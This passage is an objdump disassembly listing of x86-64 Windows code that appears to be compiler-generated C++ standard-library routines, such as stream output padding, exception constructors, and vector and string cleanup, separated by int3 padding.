   1400016da:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400016df:	57                   	push   %rdi
   1400016e0:	41 54                	push   %r12
   1400016e2:	41 55                	push   %r13
   1400016e4:	41 56                	push   %r14
   1400016e6:	41 57                	push   %r15
   1400016e8:	48 83 ec 30          	sub    $0x30,%rsp
   1400016ec:	4d 8b e0             	mov    %r8,%r12
   1400016ef:	4c 8b ea             	mov    %rdx,%r13
   1400016f2:	48 8b f9             	mov    %rcx,%rdi
   1400016f5:	33 f6                	xor    %esi,%esi
   1400016f7:	89 74 24 78          	mov    %esi,0x78(%rsp)
   1400016fb:	48 8b 01             	mov    (%rcx),%rax
   1400016fe:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001702:	48 03 cf             	add    %rdi,%rcx
   140001705:	ff 15 cd 8b 00 00    	call   *0x8bcd(%rip)        # 0x14000a2d8
   14000170b:	48 85 c0             	test   %rax,%rax
   14000170e:	7e 2d                	jle    0x14000173d
   140001710:	48 8b 07             	mov    (%rdi),%rax
   140001713:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001717:	48 03 cf             	add    %rdi,%rcx
   14000171a:	ff 15 b8 8b 00 00    	call   *0x8bb8(%rip)        # 0x14000a2d8
   140001720:	49 3b c4             	cmp    %r12,%rax
   140001723:	76 18                	jbe    0x14000173d
   140001725:	48 8b 07             	mov    (%rdi),%rax
   140001728:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000172c:	48 03 cf             	add    %rdi,%rcx
   14000172f:	ff 15 a3 8b 00 00    	call   *0x8ba3(%rip)        # 0x14000a2d8
   140001735:	4c 8b f0             	mov    %rax,%r14
   140001738:	4d 2b f4             	sub    %r12,%r14
   14000173b:	eb 03                	jmp    0x140001740
   14000173d:	4c 8b f6             	mov    %rsi,%r14
   140001740:	4c 8b ff             	mov    %rdi,%r15
   140001743:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001748:	48 8b 07             	mov    (%rdi),%rax
   14000174b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000174f:	48 03 cf             	add    %rdi,%rcx
   140001752:	ff 15 b0 8b 00 00    	call   *0x8bb0(%rip)        # 0x14000a308
   140001758:	48 85 c0             	test   %rax,%rax
   14000175b:	74 0d                	je     0x14000176a
   14000175d:	48 8b 08             	mov    (%rax),%rcx
   140001760:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001764:	48 8b c8             	mov    %rax,%rcx
   140001767:	ff d2                	call   *%rdx
   140001769:	90                   	nop
   14000176a:	48 8b 07             	mov    (%rdi),%rax
   14000176d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001771:	48 03 cf             	add    %rdi,%rcx
   140001774:	ff 15 76 8b 00 00    	call   *0x8b76(%rip)        # 0x14000a2f0
   14000177a:	84 c0                	test   %al,%al
   14000177c:	75 06                	jne    0x140001784
   14000177e:	88 44 24 28          	mov    %al,0x28(%rsp)
   140001782:	eb 40                	jmp    0x1400017c4
   140001784:	48 8b 07             	mov    (%rdi),%rax
   140001787:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000178b:	48 03 cf             	add    %rdi,%rcx
   14000178e:	ff 15 0c 8b 00 00    	call   *0x8b0c(%rip)        # 0x14000a2a0
   140001794:	48 85 c0             	test   %rax,%rax
   140001797:	74 24                	je     0x1400017bd
   140001799:	48 3b c7             	cmp    %rdi,%rax
   14000179c:	74 1f                	je     0x1400017bd
   14000179e:	48 8b c8             	mov    %rax,%rcx
   1400017a1:	ff 15 41 89 00 00    	call   *0x8941(%rip)        # 0x14000a0e8
   1400017a7:	48 8b 07             	mov    (%rdi),%rax
   1400017aa:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400017ae:	48 03 cf             	add    %rdi,%rcx
   1400017b1:	ff 15 39 8b 00 00    	call   *0x8b39(%rip)        # 0x14000a2f0
   1400017b7:	88 44 24 28          	mov    %al,0x28(%rsp)
   1400017bb:	eb 07                	jmp    0x1400017c4
   1400017bd:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400017c2:	b0 01                	mov    $0x1,%al
   1400017c4:	84 c0                	test   %al,%al
   1400017c6:	75 0a                	jne    0x1400017d2
   1400017c8:	be 04 00 00 00       	mov    $0x4,%esi
   1400017cd:	e9 06 01 00 00       	jmp    0x1400018d8
   1400017d2:	48 8b 07             	mov    (%rdi),%rax
   1400017d5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400017d9:	48 03 cf             	add    %rdi,%rcx
   1400017dc:	ff 15 06 8b 00 00    	call   *0x8b06(%rip)        # 0x14000a2e8
   1400017e2:	25 c0 01 00 00       	and    $0x1c0,%eax
   1400017e7:	83 f8 40             	cmp    $0x40,%eax
   1400017ea:	0f 84 a3 00 00 00    	je     0x140001893
   1400017f0:	4d 85 f6             	test   %r14,%r14
   1400017f3:	0f 84 9a 00 00 00    	je     0x140001893
   1400017f9:	48 8b 07             	mov    (%rdi),%rax
   1400017fc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001800:	48 03 cf             	add    %rdi,%rcx
   140001803:	ff 15 ff 8a 00 00    	call   *0x8aff(%rip)        # 0x14000a308
   140001809:	48 8b d8             	mov    %rax,%rbx
   14000180c:	48 8b 0f             	mov    (%rdi),%rcx
   14000180f:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   140001813:	48 03 cf             	add    %rdi,%rcx
   140001816:	ff 15 9c 8a 00 00    	call   *0x8a9c(%rip)        # 0x14000a2b8
   14000181c:	0f b6 d0             	movzbl %al,%edx
   14000181f:	48 8b cb             	mov    %rbx,%rcx
   140001822:	ff 15 98 8a 00 00    	call   *0x8a98(%rip)        # 0x14000a2c0
   140001828:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000182b:	75 5e                	jne    0x14000188b
   14000182d:	be 04 00 00 00       	mov    $0x4,%esi
   140001832:	89 74 24 78          	mov    %esi,0x78(%rsp)
   140001836:	4d 85 f6             	test   %r14,%r14
   140001839:	74 3b                	je     0x140001876
   14000183b:	48 8b 07             	mov    (%rdi),%rax
   14000183e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001842:	48 03 cf             	add    %rdi,%rcx
   140001845:	ff 15 bd 8a 00 00    	call   *0x8abd(%rip)        # 0x14000a308
   14000184b:	48 8b d8             	mov    %rax,%rbx
   14000184e:	48 8b 0f             	mov    (%rdi),%rcx
   140001851:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   140001855:	48 03 cf             	add    %rdi,%rcx
   140001858:	ff 15 5a 8a 00 00    	call   *0x8a5a(%rip)        # 0x14000a2b8
   14000185e:	0f b6 d0             	movzbl %al,%edx
   140001861:	48 8b cb             	mov    %rbx,%rcx
   140001864:	ff 15 56 8a 00 00    	call   *0x8a56(%rip)        # 0x14000a2c0
   14000186a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000186d:	75 53                	jne    0x1400018c2
   14000186f:	83 ce 04             	or     $0x4,%esi
   140001872:	89 74 24 78          	mov    %esi,0x78(%rsp)
   140001876:	48 8b 07             	mov    (%rdi),%rax
   140001879:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000187d:	48 03 cf             	add    %rdi,%rcx
   140001880:	33 d2                	xor    %edx,%edx
   140001882:	ff 15 48 8a 00 00    	call   *0x8a48(%rip)        # 0x14000a2d0
   140001888:	90                   	nop
   140001889:	eb 4d                	jmp    0x1400018d8
   14000188b:	49 ff ce             	dec    %r14
   14000188e:	e9 5d ff ff ff       	jmp    0x1400017f0
   140001893:	48 8b 07             	mov    (%rdi),%rax
   140001896:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000189a:	48 03 cf             	add    %rdi,%rcx
   14000189d:	ff 15 65 8a 00 00    	call   *0x8a65(%rip)        # 0x14000a308
   1400018a3:	4d 8b c4             	mov    %r12,%r8
   1400018a6:	49 8b d5             	mov    %r13,%rdx
   1400018a9:	48 8b c8             	mov    %rax,%rcx
   1400018ac:	ff 15 fe 89 00 00    	call   *0x89fe(%rip)        # 0x14000a2b0
   1400018b2:	49 3b c4             	cmp    %r12,%rax
   1400018b5:	0f 84 7b ff ff ff    	je     0x140001836
   1400018bb:	be 04 00 00 00       	mov    $0x4,%esi
   1400018c0:	eb b0                	jmp    0x140001872
   1400018c2:	49 ff ce             	dec    %r14
   1400018c5:	e9 6c ff ff ff       	jmp    0x140001836
   1400018ca:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400018cf:	8b 74 24 78          	mov    0x78(%rsp),%esi
   1400018d3:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   1400018d8:	48 8b 07             	mov    (%rdi),%rax
   1400018db:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400018df:	48 03 cf             	add    %rdi,%rcx
   1400018e2:	45 33 c0             	xor    %r8d,%r8d
   1400018e5:	8b d6                	mov    %esi,%edx
   1400018e7:	ff 15 bb 89 00 00    	call   *0x89bb(%rip)        # 0x14000a2a8
   1400018ed:	90                   	nop
   1400018ee:	e8 0c 6e 00 00       	call   0x1400086ff
   1400018f3:	84 c0                	test   %al,%al
   1400018f5:	75 0a                	jne    0x140001901
   1400018f7:	49 8b cf             	mov    %r15,%rcx
   1400018fa:	ff 15 c8 89 00 00    	call   *0x89c8(%rip)        # 0x14000a2c8
   140001900:	90                   	nop
   140001901:	49 8b 07             	mov    (%r15),%rax
   140001904:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001908:	49 03 cf             	add    %r15,%rcx
   14000190b:	ff 15 f7 89 00 00    	call   *0x89f7(%rip)        # 0x14000a308
   140001911:	48 85 c0             	test   %rax,%rax
   140001914:	74 0d                	je     0x140001923
   140001916:	48 8b 08             	mov    (%rax),%rcx
   140001919:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   14000191d:	48 8b c8             	mov    %rax,%rcx
   140001920:	ff d2                	call   *%rdx
   140001922:	90                   	nop
   140001923:	48 8b c7             	mov    %rdi,%rax
   140001926:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000192b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140001930:	48 83 c4 30          	add    $0x30,%rsp
   140001934:	41 5f                	pop    %r15
   140001936:	41 5e                	pop    %r14
   140001938:	41 5d                	pop    %r13
   14000193a:	41 5c                	pop    %r12
   14000193c:	5f                   	pop    %rdi
   14000193d:	c3                   	ret
   14000193e:	cc                   	int3
   14000193f:	cc                   	int3
   140001940:	40 53                	rex push %rbx
   140001942:	48 83 ec 20          	sub    $0x20,%rsp
   140001946:	48 8b d9             	mov    %rcx,%rbx
   140001949:	48 8b c2             	mov    %rdx,%rax
   14000194c:	48 8d 0d d5 8c 00 00 	lea    0x8cd5(%rip),%rcx        # 0x14000a628
   140001953:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001956:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000195a:	48 89 0b             	mov    %rcx,(%rbx)
   14000195d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001961:	0f 11 02             	movups %xmm0,(%rdx)
   140001964:	e8 bd 7c 00 00       	call   0x140009626
   140001969:	48 8d 05 e8 8c 00 00 	lea    0x8ce8(%rip),%rax        # 0x14000a658
   140001970:	48 89 03             	mov    %rax,(%rbx)
   140001973:	48 8b c3             	mov    %rbx,%rax
   140001976:	48 83 c4 20          	add    $0x20,%rsp
   14000197a:	5b                   	pop    %rbx
   14000197b:	c3                   	ret
   14000197c:	cc                   	int3
   14000197d:	cc                   	int3
   14000197e:	cc                   	int3
   14000197f:	cc                   	int3
   140001980:	40 53                	rex push %rbx
   140001982:	48 83 ec 20          	sub    $0x20,%rsp
   140001986:	48 8b d9             	mov    %rcx,%rbx
   140001989:	48 8b c2             	mov    %rdx,%rax
   14000198c:	48 8d 0d 95 8c 00 00 	lea    0x8c95(%rip),%rcx        # 0x14000a628
   140001993:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001996:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000199a:	48 89 0b             	mov    %rcx,(%rbx)
   14000199d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400019a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400019a4:	e8 7d 7c 00 00       	call   0x140009626
   1400019a9:	48 8d 05 c0 8c 00 00 	lea    0x8cc0(%rip),%rax        # 0x14000a670
   1400019b0:	48 89 03             	mov    %rax,(%rbx)
   1400019b3:	48 8b c3             	mov    %rbx,%rax
   1400019b6:	48 83 c4 20          	add    $0x20,%rsp
   1400019ba:	5b                   	pop    %rbx
   1400019bb:	c3                   	ret
   1400019bc:	cc                   	int3
   1400019bd:	cc                   	int3
   1400019be:	cc                   	int3
   1400019bf:	cc                   	int3
   1400019c0:	48 8d 05 b9 8c 00 00 	lea    0x8cb9(%rip),%rax        # 0x14000a680
   1400019c7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400019ce:	00 
   1400019cf:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400019d3:	48 8d 05 96 8c 00 00 	lea    0x8c96(%rip),%rax        # 0x14000a670
   1400019da:	48 89 01             	mov    %rax,(%rcx)
   1400019dd:	48 8b c1             	mov    %rcx,%rax
   1400019e0:	c3                   	ret
   1400019e1:	cc                   	int3
   1400019e2:	cc                   	int3
   1400019e3:	cc                   	int3
   1400019e4:	cc                   	int3
   1400019e5:	cc                   	int3
   1400019e6:	cc                   	int3
   1400019e7:	cc                   	int3
   1400019e8:	cc                   	int3
   1400019e9:	cc                   	int3
   1400019ea:	cc                   	int3
   1400019eb:	cc                   	int3
   1400019ec:	cc                   	int3
   1400019ed:	cc                   	int3
   1400019ee:	cc                   	int3
   1400019ef:	cc                   	int3
   1400019f0:	40 53                	rex push %rbx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	48 8b d9             	mov    %rcx,%rbx
   1400019f9:	48 8b c2             	mov    %rdx,%rax
   1400019fc:	48 8d 0d 25 8c 00 00 	lea    0x8c25(%rip),%rcx        # 0x14000a628
   140001a03:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001a06:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001a0a:	48 89 0b             	mov    %rcx,(%rbx)
   140001a0d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001a11:	0f 11 02             	movups %xmm0,(%rdx)
   140001a14:	e8 0d 7c 00 00       	call   0x140009626
   140001a19:	48 8b c3             	mov    %rbx,%rax
   140001a1c:	48 83 c4 20          	add    $0x20,%rsp
   140001a20:	5b                   	pop    %rbx
   140001a21:	c3                   	ret
   140001a22:	cc                   	int3
   140001a23:	cc                   	int3
   140001a24:	cc                   	int3
   140001a25:	cc                   	int3
   140001a26:	cc                   	int3
   140001a27:	cc                   	int3
   140001a28:	cc                   	int3
   140001a29:	cc                   	int3
   140001a2a:	cc                   	int3
   140001a2b:	cc                   	int3
   140001a2c:	cc                   	int3
   140001a2d:	cc                   	int3
   140001a2e:	cc                   	int3
   140001a2f:	cc                   	int3
   140001a30:	e9 4b 02 00 00       	jmp    0x140001c80
   140001a35:	cc                   	int3
   140001a36:	cc                   	int3
   140001a37:	cc                   	int3
   140001a38:	cc                   	int3
   140001a39:	cc                   	int3
   140001a3a:	cc                   	int3
   140001a3b:	cc                   	int3
   140001a3c:	cc                   	int3
   140001a3d:	cc                   	int3
   140001a3e:	cc                   	int3
   140001a3f:	cc                   	int3
   140001a40:	40 53                	rex push %rbx
   140001a42:	48 83 ec 30          	sub    $0x30,%rsp
   140001a46:	48 8b d9             	mov    %rcx,%rbx
   140001a49:	48 8b 09             	mov    (%rcx),%rcx
   140001a4c:	48 85 c9             	test   %rcx,%rcx
   140001a4f:	74 5d                	je     0x140001aae
   140001a51:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140001a55:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140001a5c:	aa aa 2a 
   140001a5f:	48 2b d1             	sub    %rcx,%rdx
   140001a62:	48 f7 ea             	imul   %rdx
   140001a65:	48 c1 fa 02          	sar    $0x2,%rdx
   140001a69:	48 8b c2             	mov    %rdx,%rax
   140001a6c:	48 c1 e8 3f          	shr    $0x3f,%rax
   140001a70:	48 03 d0             	add    %rax,%rdx
   140001a73:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
   140001a77:	48 c1 e2 03          	shl    $0x3,%rdx
   140001a7b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001a82:	72 18                	jb     0x140001a9c
   140001a84:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140001a88:	48 83 c2 27          	add    $0x27,%rdx
   140001a8c:	48 2b c8             	sub    %rax,%rcx
   140001a8f:	48 83 e9 08          	sub    $0x8,%rcx
   140001a93:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140001a97:	77 1b                	ja     0x140001ab4
   140001a99:	48 8b c8             	mov    %rax,%rcx
   140001a9c:	e8 37 6d 00 00       	call   0x1400087d8
   140001aa1:	33 c0                	xor    %eax,%eax
   140001aa3:	48 89 03             	mov    %rax,(%rbx)
   140001aa6:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001aaa:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001aae:	48 83 c4 30          	add    $0x30,%rsp
   140001ab2:	5b                   	pop    %rbx
   140001ab3:	c3                   	ret
   140001ab4:	33 c0                	xor    %eax,%eax
   140001ab6:	45 33 c9             	xor    %r9d,%r9d
   140001ab9:	45 33 c0             	xor    %r8d,%r8d
   140001abc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001ac1:	33 d2                	xor    %edx,%edx
   140001ac3:	33 c9                	xor    %ecx,%ecx
   140001ac5:	ff 15 9d 89 00 00    	call   *0x899d(%rip)        # 0x14000a468
   140001acb:	cc                   	int3
   140001acc:	cc                   	int3
   140001acd:	cc                   	int3
   140001ace:	cc                   	int3
   140001acf:	cc                   	int3
   140001ad0:	40 53                	rex push %rbx
   140001ad2:	48 83 ec 30          	sub    $0x30,%rsp
   140001ad6:	48 8b d9             	mov    %rcx,%rbx
   140001ad9:	48 8b 09             	mov    (%rcx),%rcx
   140001adc:	48 85 c9             	test   %rcx,%rcx
   140001adf:	74 5d                	je     0x140001b3e
   140001ae1:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140001ae5:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   140001aec:	66 66 66 
   140001aef:	48 2b d1             	sub    %rcx,%rdx
   140001af2:	48 f7 ea             	imul   %rdx
   140001af5:	48 c1 fa 04          	sar    $0x4,%rdx
   140001af9:	48 8b c2             	mov    %rdx,%rax
   140001afc:	48 c1 e8 3f          	shr    $0x3f,%rax
   140001b00:	48 03 d0             	add    %rax,%rdx
   140001b03:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140001b07:	48 c1 e2 03          	shl    $0x3,%rdx
   140001b0b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001b12:	72 18                	jb     0x140001b2c
   140001b14:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140001b18:	48 83 c2 27          	add    $0x27,%rdx
   140001b1c:	48 2b c8             	sub    %rax,%rcx
   140001b1f:	48 83 e9 08          	sub    $0x8,%rcx
   140001b23:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140001b27:	77 1b                	ja     0x140001b44
   140001b29:	48 8b c8             	mov    %rax,%rcx
   140001b2c:	e8 a7 6c 00 00       	call   0x1400087d8
   140001b31:	33 c0                	xor    %eax,%eax
   140001b33:	48 89 03             	mov    %rax,(%rbx)
   140001b36:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001b3a:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001b3e:	48 83 c4 30          	add    $0x30,%rsp
   140001b42:	5b                   	pop    %rbx
   140001b43:	c3                   	ret
   140001b44:	33 c0                	xor    %eax,%eax
   140001b46:	45 33 c9             	xor    %r9d,%r9d
   140001b49:	45 33 c0             	xor    %r8d,%r8d
   140001b4c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b51:	33 d2                	xor    %edx,%edx
   140001b53:	33 c9                	xor    %ecx,%ecx
   140001b55:	ff 15 0d 89 00 00    	call   *0x890d(%rip)        # 0x14000a468
   140001b5b:	cc                   	int3
   140001b5c:	cc                   	int3
   140001b5d:	cc                   	int3
   140001b5e:	cc                   	int3
   140001b5f:	cc                   	int3
   140001b60:	48 83 c1 10          	add    $0x10,%rcx
   140001b64:	e9 17 01 00 00       	jmp    0x140001c80
   140001b69:	cc                   	int3
   140001b6a:	cc                   	int3
   140001b6b:	cc                   	int3
   140001b6c:	cc                   	int3
   140001b6d:	cc                   	int3
   140001b6e:	cc                   	int3
   140001b6f:	cc                   	int3
   140001b70:	48 83 ec 28          	sub    $0x28,%rsp
   140001b74:	48 8b 11             	mov    (%rcx),%rdx
   140001b77:	48 8b 02             	mov    (%rdx),%rax
   140001b7a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001b7e:	48 03 ca             	add    %rdx,%rcx
   140001b81:	ff 15 81 87 00 00    	call   *0x8781(%rip)        # 0x14000a308
   140001b87:	48 85 c0             	test   %rax,%rax
   140001b8a:	74 0d                	je     0x140001b99
   140001b8c:	48 8b 08             	mov    (%rax),%rcx
   140001b8f:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140001b93:	48 8b c8             	mov    %rax,%rcx
   140001b96:	ff d2                	call   *%rdx
   140001b98:	90                   	nop
   140001b99:	48 83 c4 28          	add    $0x28,%rsp
   140001b9d:	c3                   	ret
   140001b9e:	cc                   	int3
   140001b9f:	cc                   	int3
   140001ba0:	48 8d 05 81 8a 00 00 	lea    0x8a81(%rip),%rax        # 0x14000a628
   140001ba7:	48 89 01             	mov    %rax,(%rcx)
   140001baa:	48 83 c1 08          	add    $0x8,%rcx
   140001bae:	e9 79 7a 00 00       	jmp    0x14000962c
   140001bb3:	cc                   	int3
   140001bb4:	cc                   	int3
   140001bb5:	cc                   	int3
   140001bb6:	cc                   	int3
   140001bb7:	cc                   	int3
   140001bb8:	cc                   	int3
   140001bb9:	cc                   	int3
   140001bba:	cc                   	int3
   140001bbb:	cc                   	int3
   140001bbc:	cc                   	int3
   140001bbd:	cc                   	int3
   140001bbe:	cc                   	int3
   140001bbf:	cc                   	int3
   140001bc0:	40 53                	rex push %rbx
   140001bc2:	48 83 ec 20          	sub    $0x20,%rsp
   140001bc6:	48 8b d9             	mov    %rcx,%rbx
   140001bc9:	e8 31 6b 00 00       	call   0x1400086ff
   140001bce:	84 c0                	test   %al,%al
   140001bd0:	75 0a                	jne    0x140001bdc
   140001bd2:	48 8b 0b             	mov    (%rbx),%rcx
   140001bd5:	ff 15 ed 86 00 00    	call   *0x86ed(%rip)        # 0x14000a2c8
   140001bdb:	90                   	nop
   140001bdc:	48 8b 13             	mov    (%rbx),%rdx
   140001bdf:	48 8b 02             	mov    (%rdx),%rax
   140001be2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001be6:	48 03 ca             	add    %rdx,%rcx
   140001be9:	ff 15 19 87 00 00    	call   *0x8719(%rip)        # 0x14000a308
   140001bef:	48 85 c0             	test   %rax,%rax
   140001bf2:	74 0d                	je     0x140001c01
   140001bf4:	48 8b 08             	mov    (%rax),%rcx
   140001bf7:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140001bfb:	48 8b c8             	mov    %rax,%rcx
   140001bfe:	ff d2                	call   *%rdx
   140001c00:	90                   	nop
   140001c01:	48 83 c4 20          	add    $0x20,%rsp
   140001c05:	5b                   	pop    %rbx
   140001c06:	c3                   	ret
   140001c07:	cc                   	int3
   140001c08:	cc                   	int3
   140001c09:	cc                   	int3
   140001c0a:	cc                   	int3
   140001c0b:	cc                   	int3
   140001c0c:	cc                   	int3
   140001c0d:	cc                   	int3
   140001c0e:	cc                   	int3
   140001c0f:	cc                   	int3
   140001c10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c15:	57                   	push   %rdi
   140001c16:	48 83 ec 20          	sub    $0x20,%rsp
   140001c1a:	48 8d 05 07 8a 00 00 	lea    0x8a07(%rip),%rax        # 0x14000a628
   140001c21:	48 8b f9             	mov    %rcx,%rdi
   140001c24:	48 89 01             	mov    %rax,(%rcx)
   140001c27:	8b da                	mov    %edx,%ebx
   140001c29:	48 83 c1 08          	add    $0x8,%rcx
   140001c2d:	e8 fa 79 00 00       	call   0x14000962c
   140001c32:	f6 c3 01             	test   $0x1,%bl
   140001c35:	74 0d                	je     0x140001c44
   140001c37:	ba 18 00 00 00       	mov    $0x18,%edx
   140001c3c:	48 8b cf             	mov    %rdi,%rcx
   140001c3f:	e8 94 6b 00 00       	call   0x1400087d8
   140001c44:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001c49:	48 8b c7             	mov    %rdi,%rax
   140001c4c:	48 83 c4 20          	add    $0x20,%rsp
   140001c50:	5f                   	pop    %rdi
   140001c51:	c3                   	ret
   140001c52:	cc                   	int3
   140001c53:	cc                   	int3
   140001c54:	cc                   	int3
   140001c55:	cc                   	int3
   140001c56:	cc                   	int3
   140001c57:	cc                   	int3
   140001c58:	cc                   	int3
   140001c59:	cc                   	int3
   140001c5a:	cc                   	int3
   140001c5b:	cc                   	int3
   140001c5c:	cc                   	int3
   140001c5d:	cc                   	int3
   140001c5e:	cc                   	int3
   140001c5f:	cc                   	int3
   140001c60:	48 83 ec 48          	sub    $0x48,%rsp
   140001c64:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c69:	e8 52 fd ff ff       	call   0x1400019c0
   140001c6e:	48 8d 15 9b da 00 00 	lea    0xda9b(%rip),%rdx        # 0x14000f710
   140001c75:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c7a:	e8 b3 79 00 00       	call   0x140009632
   140001c7f:	cc                   	int3
   140001c80:	40 53                	rex push %rbx
   140001c82:	48 83 ec 30          	sub    $0x30,%rsp
   140001c86:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140001c8a:	48 8b d9             	mov    %rcx,%rbx
   140001c8d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140001c91:	76 2c                	jbe    0x140001cbf
   140001c93:	48 8b 09             	mov    (%rcx),%rcx
   140001c96:	48 ff c2             	inc    %rdx
   140001c99:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001ca0:	72 18                	jb     0x140001cba
   140001ca2:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140001ca6:	48 83 c2 27          	add    $0x27,%rdx
   140001caa:	48 2b c8             	sub    %rax,%rcx
   140001cad:	48 83 e9 08          	sub    $0x8,%rcx
   140001cb1:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140001cb5:	77 21                	ja     0x140001cd8
   140001cb7:	48 8b c8             	mov    %rax,%rcx
   140001cba:	e8 19 6b 00 00       	call   0x1400087d8
   140001cbf:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140001cc6:	00 
   140001cc7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140001cce:	00 
   140001ccf:	c6 03 00             	movb   $0x0,(%rbx)
   140001cd2:	48 83 c4 30          	add    $0x30,%rsp
   140001cd6:	5b                   	pop    %rbx
   140001cd7:	c3                   	ret
   140001cd8:	45 33 c9             	xor    %r9d,%r9d
   140001cdb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001ce2:	00 00 
   140001ce4:	45 33 c0             	xor    %r8d,%r8d
   140001ce7:	33 d2                	xor    %edx,%edx
   140001ce9:	33 c9                	xor    %ecx,%ecx
   140001ceb:	ff 15 77 87 00 00    	call   *0x8777(%rip)        # 0x14000a468
   140001cf1:	cc                   	int3
   140001cf2:	cc                   	int3
   140001cf3:	cc                   	int3
   140001cf4:	cc                   	int3
   140001cf5:	cc                   	int3
   140001cf6:	cc                   	int3
   140001cf7:	cc                   	int3
   140001cf8:	cc                   	int3
   140001cf9:	cc                   	int3
   140001cfa:	cc                   	int3
   140001cfb:	cc                   	int3
   140001cfc:	cc                   	int3
   140001cfd:	cc                   	int3
   140001cfe:	cc                   	int3
   140001cff:	cc                   	int3
   140001d00:	48 83 ec 28          	sub    $0x28,%rsp
   140001d04:	48 8d 0d 8d 89 00 00 	lea    0x898d(%rip),%rcx        # 0x14000a698
   140001d0b:	e8 e9 69 00 00       	call   0x1400086f9
   140001d10:	cc                   	int3
   140001d11:	cc                   	int3
   140001d12:	cc                   	int3
   140001d13:	cc                   	int3
   140001d14:	cc                   	int3
   140001d15:	cc                   	int3
   140001d16:	cc                   	int3
   140001d17:	cc                   	int3
   140001d18:	cc                   	int3
   140001d19:	cc                   	int3
   140001d1a:	cc                   	int3
   140001d1b:	cc                   	int3
   140001d1c:	cc                   	int3
   140001d1d:	cc                   	int3
   140001d1e:	cc                   	int3
   140001d1f:	cc                   	int3
   140001d20:	48 83 ec 28          	sub    $0x28,%rsp
   140001d24:	48 8d 0d 2d 8c 00 00 	lea    0x8c2d(%rip),%rcx        # 0x14000a958
   140001d2b:	e8 c9 69 00 00       	call   0x1400086f9
   140001d30:	cc                   	int3
   140001d31:	cc                   	int3
   140001d32:	cc                   	int3
   140001d33:	cc                   	int3
   140001d34:	cc                   	int3
   140001d35:	cc                   	int3
   140001d36:	cc                   	int3
   140001d37:	cc                   	int3
   140001d38:	cc                   	int3
   140001d39:	cc                   	int3
   140001d3a:	cc                   	int3
   140001d3b:	cc                   	int3
   140001d3c:	cc                   	int3
   140001d3d:	cc                   	int3
   140001d3e:	cc                   	int3
   140001d3f:	cc                   	int3
   140001d40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
